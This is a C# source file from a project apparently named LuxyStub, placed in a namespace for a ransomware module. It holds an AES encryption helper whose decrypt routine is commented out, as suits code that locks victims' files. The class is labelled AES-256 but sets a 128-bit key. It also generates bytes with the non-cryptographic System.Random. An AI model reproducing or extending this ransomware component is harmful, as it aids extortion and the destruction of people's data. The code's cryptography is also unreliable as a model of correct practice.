using System;
using System.IO;
using System.Security.Cryptography;

namespace LuxyStub.Modules.Ransomware.Components.Algorithms
{
    internal static class Aes256
    {
        public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;

                aes.Key = key;
                aes.IV = iv;

                using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(data, encryptor);
                }
            }
        }

        //public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        //{
        //    using (var aes = Aes.Create())
        //    {
        //        aes.KeySize = 128;
        //        aes.BlockSize = 128;
        //        aes.Padding = PaddingMode.Zeros;

        //        aes.Key = key;
        //        aes.IV = iv;

        //        using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
        //        {
        //            return PerformCryptography(data, decryptor);
        //        }
        //    }
        //}

        private static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] RandomBytesArray(int size)
        {
            Random rnd = new Random();
            byte[] b = new byte[size];
            rnd.NextBytes(b);
            return b;
        }


        //var key = new byte[16] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        //var iv = new byte[16] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        //var input = new byte[16] { 0x1E, 0xA0, 0x35, 0x3A, 0x7D, 0x29, 0x47, 0xD8, 0xBB, 0xC6, 0xAD, 0x6F, 0xB5, 0x2F, 0xCA, 0x84 };

        //var crypto = new AesCryptographyService();

        //var encrypted = crypto.Encrypt(input, key, iv);
        //var str = BitConverter.ToString(encrypted).Replace("-", "");
    }
}